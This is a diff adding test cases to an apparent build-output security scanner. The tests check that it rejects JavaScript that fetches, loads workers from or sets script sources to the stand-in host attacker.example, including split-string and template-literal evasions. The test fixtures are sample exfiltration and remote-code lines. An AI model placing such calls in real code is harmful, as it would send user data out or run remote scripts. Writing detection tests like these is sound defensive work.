@@ -134,6 +134,29 @@ test('allows converter output text while still rejecting a DOM runtime source as
   )).toThrow(/external runtime origin/i)
 })
 
+test.each([
+  ['const endpoint = "https://attacker.example/collect"; fetch(endpoint)'],
+  ['const endpoint = "https:" + "//attacker.example/collect"; fetch(endpoint)'],
+  ['const host = "attacker.example"; fetch(`https://${host}/collect`)'],
+  ['fetch(new URL("https://attacker.example/collect"))'],
+  ['new Worker(new URL("https://attacker.example/worker.js"))'],
+  ['const endpoint = "https://attacker.example/app.js"; element.setAttribute("src", endpoint)'],
+  ['const endpoint = "//attacker.example/app.js"; element.setAttribute("href", endpoint)'],
+])('rejects indirect external JavaScript runtime sink: %s', (contents) => {
+  expect(() => assertNoExternalRuntimeOrigins('app.js', contents)).toThrow(/external runtime origin/i)
+})
+
+test('allows only exact reviewed external legal navigation values', () => {
+  expect(() => assertNoExternalRuntimeOrigins(
+    'app.js',
+    'jsx("a", { href: "https://github.com/ThisIsPhantom/folkkit/tree/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" })',
+  )).not.toThrow()
+  expect(() => assertNoExternalRuntimeOrigins(
+    'app.js',
+    'jsx("a", { href: "https://github.com/ThisIsPhantom/folkkit-malicious" })',
+  )).toThrow(/external runtime origin/i)
+})
+
 test('scans SVG, manifest JSON, MJS and nested worker artifacts in the final build tree', async () => {
   const distDirectory = await createTemporaryDirectory()
   await mkdir(join(distDirectory, 'nested'), { recursive: true })
